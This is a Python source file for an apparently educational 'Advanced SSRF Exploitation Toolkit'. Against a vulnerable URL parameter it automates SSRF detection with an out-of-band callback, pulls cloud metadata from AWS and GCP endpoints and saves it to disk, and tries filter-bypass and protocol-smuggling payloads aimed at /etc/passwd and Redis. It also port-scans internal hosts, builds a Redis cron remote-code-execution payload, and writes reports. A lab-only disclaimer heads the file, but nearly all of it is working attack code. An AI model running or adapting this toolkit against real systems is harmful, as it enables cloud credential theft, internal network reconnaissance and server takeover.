#!/usr/bin/env python3
"""
ssrf_advanced_toolkit.py — Advanced SSRF Exploitation Toolkit (Project #47)
LEGAL: only test your own lab or PortSwigger labs.
"""

import argparse
import json
import os
import time
from datetime import datetime

import requests

import ssrf_advanced_payloads as P

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
LISTENER_LOG = "listener/callbacks.log"
DEFAULT_TIMEOUT = 12

class Colors:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

class AdvancedSSRFToolkit:
    def __init__(self, target_url, param="url",
                 oob_url="http://127.0.0.1:9999/ssrf-callback",
                 timeout=DEFAULT_TIMEOUT):
        self.target = target_url
        self.param = param
        self.oob_url = oob_url
        self.timeout = timeout

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)
        os.makedirs("listener", exist_ok=True)

        self.report = {
            "target": target_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    # ------------------------------------------------------------------
    def _inject(self, payload, headers=None):
        try:
            r = requests.get(
                self.target,
                params={self.param: payload},
                headers=headers or {},
                timeout=self.timeout,
                allow_redirects=True,
            )
            return r.status_code, r.text, r.elapsed.total_seconds()
        except requests.exceptions.Timeout:
            return None, "[TIMEOUT]", self.timeout
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", 0.0

    def _has(self, body, indicators):
        if not body:
            return False, None
        for ind in indicators:
            if ind in body:
                return True, ind
        return False, None

    def _reset_listener_log(self):
        try:
            if os.path.exists(LISTENER_LOG):
                os.remove(LISTENER_LOG)
        except Exception:
            pass

    def _read_listener_log(self):
        try:
            if os.path.exists(LISTENER_LOG):
                with open(LISTENER_LOG) as f:
                    return f.read()
        except Exception:
            pass
        return ""

    # ------------------------------------------------------------------
    # PHASE 1 — Detection (incl. OOB)
    # ------------------------------------------------------------------
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] SSRF DETECTION{Colors.RESET}")
        results = {}

        # --- Response-based ---
        print(f"\n  [RESPONSE_BASED] {P.DETECTION['internal_secret']}")
        status, body, elapsed = self._inject(P.DETECTION["internal_secret"])
        hit, ind = self._has(body, P.INDICATORS["internal_secret"])
        if hit:
            print(f"    {Colors.GREEN}[+] SSRF CONFIRMED!{Colors.RESET} internal content returned")
        else:
            print(f"    {Colors.YELLOW}[-] no internal content{Colors.RESET}")
        results["response_based"] = {"confirmed": hit, "snippet": (body or "")[:300]}

        # --- Time-based ---
        print(f"\n  [TIME_BASED] {P.DETECTION['time_based']}")
        t0 = time.time()
        status, body, elapsed = self._inject(P.DETECTION["time_based"])
        wall = time.time() - t0
        if wall >= 3.0:
            print(f"    {Colors.GREEN}[+] SSRF CONFIRMED!{Colors.RESET} {wall:.1f}s delay")
            results["time_based"] = {"confirmed": True, "delay": wall}
        else:
            print(f"    {Colors.YELLOW}[-] no delay ({wall:.1f}s){Colors.RESET}")
            results["time_based"] = {"confirmed": False, "delay": wall}

        # --- Error-based ---
        print(f"\n  [ERROR_BASED] {P.DETECTION['error_based']}")
        status, body, elapsed = self._inject(P.DETECTION["error_based"])
        hit = body and (
            "CONN_ERROR" in body or "TIMEOUT" in body
            or "Name or service not known" in body
            or "Failed to resolve" in body
        )
        if hit:
            print(f"    {Colors.GREEN}[+] Error message leaked{Colors.RESET}")
        else:
            print(f"    {Colors.YELLOW}[-] no error{Colors.RESET}")
        results["error_based"] = {"confirmed": bool(hit), "snippet": (body or "")[:300]}

        # --- Blind OOB ---
        print(f"\n  [BLIND_OOB] {self.oob_url}")
        self._reset_listener_log()
        status, body, elapsed = self._inject(self.oob_url)
        time.sleep(1)  # give the listener time to log
        log = self._read_listener_log()
        hit = "ssrf-callback" in log
        if hit:
            print(f"    {Colors.GREEN}[+] BLIND SSRF CONFIRMED!{Colors.RESET} OOB callback received")
            print(f"    {log.strip()}")
        else:
            print(f"    {Colors.YELLOW}[-] no callback (listener running?){Colors.RESET}")
        results["blind_oob"] = {"confirmed": hit, "log": log[:500]}

        self.report["phases"]["detection"] = results

    # ------------------------------------------------------------------
    # PHASE 2 — Cloud metadata
    # ------------------------------------------------------------------
    def phase2_cloud_metadata(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] CLOUD METADATA{Colors.RESET}")
        results = {}
        for name, url in P.CLOUD_METADATA.items():
            hdrs = P.CLOUD_HEADERS.get(name.split("_")[0], {})
            print(f"\n  [{name.upper()}] {url}")
            status, body, elapsed = self._inject(url, headers=hdrs)
            hit, ind = self._has(body,
                P.INDICATORS["cloud_aws"] + P.INDICATORS["cloud_gcp"])
            if hit:
                print(f"    {Colors.GREEN}[+] METADATA! {ind}{Colors.RESET}")
                with open(f"{EXTRACTED_DIR}/cloud_{name}.txt", "w") as f:
                    f.write(body)
            else:
                print(f"    {Colors.YELLOW}[-] no metadata{Colors.RESET}")
            results[name] = {"hit": hit, "snippet": (body or "")[:300]}
        self.report["phases"]["cloud_metadata"] = results

    # ------------------------------------------------------------------
    # PHASE 3 — Filter bypass
    # ------------------------------------------------------------------
    def phase3_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] FILTER BYPASS{Colors.RESET}")
        results = {}
        for technique, payloads in P.BYPASS.items():
            results[technique] = []
            for payload in payloads:
                print(f"\n  [{technique.upper()}] {payload}")
                status, body, elapsed = self._inject(payload)
                hit, ind = self._has(body, P.INDICATORS["internal_secret"])
                if hit:
                    print(f"    {Colors.GREEN}[+] BYPASSED!{Colors.RESET}")
                else:
                    print(f"    {Colors.YELLOW}[-] blocked{Colors.RESET}")
                results[technique].append({
                    "payload": payload, "bypassed": hit,
                    "snippet": (body or "")[:200],
                })
        self.report["phases"]["filter_bypass"] = results

    # ------------------------------------------------------------------
    # PHASE 4 — Protocol smuggling
    # ------------------------------------------------------------------
    def phase4_protocol_smuggling(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] PROTOCOL SMUGGLING{Colors.RESET}")
        results = {}
        for name, payload in P.PROTOCOL_PAYLOADS.items():
            print(f"\n  [{name.upper()}] {payload[:80]}")
            status, body, elapsed = self._inject(payload)
            hit, ind = self._has(body,
                P.INDICATORS["file_passwd"] + P.INDICATORS["redis"])
            if not hit and body and "[CONN_ERROR]" not in body and "[TIMEOUT]" not in body:
                if "PARSED OK" not in body and len(body.strip()) > 20:
                    hit = True
                    ind = "response"
            if hit:
                print(f"    {Colors.GREEN}[+] WORKS! ({ind}){Colors.RESET}")
            else:
                print(f"    {Colors.YELLOW}[-] rejected{Colors.RESET}")
            results[name] = {
                "payload": payload, "worked": bool(hit),
                "snippet": (body or "")[:300],
            }
        self.report["phases"]["protocol_smuggling"] = results

    # ------------------------------------------------------------------
    # PHASE 5 — Internal port scan
    # ------------------------------------------------------------------
    def phase5_internal_scan(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] INTERNAL PORT SCAN{Colors.RESET}")
        results = []
        for host in P.SCAN_HOSTS:
            for port in P.SCAN_PORTS:
                url = f"http://{host}:{port}/"
                t0 = time.time()
                status, body, elapsed = self._inject(url)
                wall = time.time() - t0
                open_hint = body and "[CONN_ERROR]" not in body and "[TIMEOUT]" not in body
                if wall > 0.5 and not body.startswith("[ERROR"):
                    open_hint = True
                state = "OPEN" if open_hint else "closed"
                color = Colors.GREEN if open_hint else Colors.YELLOW
                print(f"    {color}[{host}:{port}] {state} ({wall:.2f}s){Colors.RESET}")
                results.append({
                    "host": host, "port": port, "state": state,
                    "elapsed": round(wall, 3),
                })
        self.report["phases"]["internal_scan"] = results

    # ------------------------------------------------------------------
    # PHASE 6 — RCE payload generation
    # ------------------------------------------------------------------
    def phase6_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] RCE PAYLOADS (informational){Colors.RESET}")
        print(f"    {Colors.YELLOW}Generated, NOT fired. Test only against your own Docker Redis.{Colors.RESET}")

        payloads = {
            "redis_cron_rce": P.redis_rce_cron_payload(),
        }
        for k, v in payloads.items():
            print(f"\n    [{k}] {v[:120]}...")
        self.report["phases"]["rce_payloads"] = payloads

    # ------------------------------------------------------------------
    # PHASE 7 — Report
    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict):
                        if (v.get("confirmed") or v.get("hit")
                                or v.get("worked") or v.get("bypassed")):
                            confirmed.append(f"{phase}.{k}")
                    elif isinstance(v, list):
                        for item in v:
                            if isinstance(item, dict) and (
                                item.get("bypassed") or item.get("worked")
                                or item.get("hit")
                            ):
                                confirmed.append(
                                    f"{phase}.{k}[{item.get('payload','')[:40]}]"
                                )
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get("state") == "OPEN":
                        confirmed.append(
                            f"{phase}.{item['host']}:{item['port']}"
                        )
        return confirmed

    def phase7_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/ssrf_advanced_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/ssrf_advanced_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>SSRF Advanced Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>Advanced SSRF Report</h1>
<p><b>Target:</b> {self.target}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  Advanced SSRF Exploitation Toolkit - Project #47")
        print("=" * 64)
        print(f"[+] Target: {self.target}")
        self.phase1_detection()
        self.phase2_cloud_metadata()
        self.phase3_filter_bypass()
        self.phase4_protocol_smuggling()
        self.phase5_internal_scan()
        self.phase6_rce()
        self.phase7_report()

def main():
    ap = argparse.ArgumentParser(description="Advanced SSRF Exploitation Toolkit")
    ap.add_argument("-t", "--target", required=True,
                    help="Vulnerable fetch URL (e.g. http://127.0.0.1:8000/fetch)")
    ap.add_argument("-p", "--param", default="url")
    ap.add_argument("--oob-url", default="http://127.0.0.1:9999/ssrf-callback")
    ap.add_argument("--timeout", type=int, default=12)
    args = ap.parse_args()

    AdvancedSSRFToolkit(
        target_url=args.target,
        param=args.param,
        oob_url=args.oob_url,
        timeout=args.timeout,
    ).run_all()

if __name__ == "__main__":
    main()
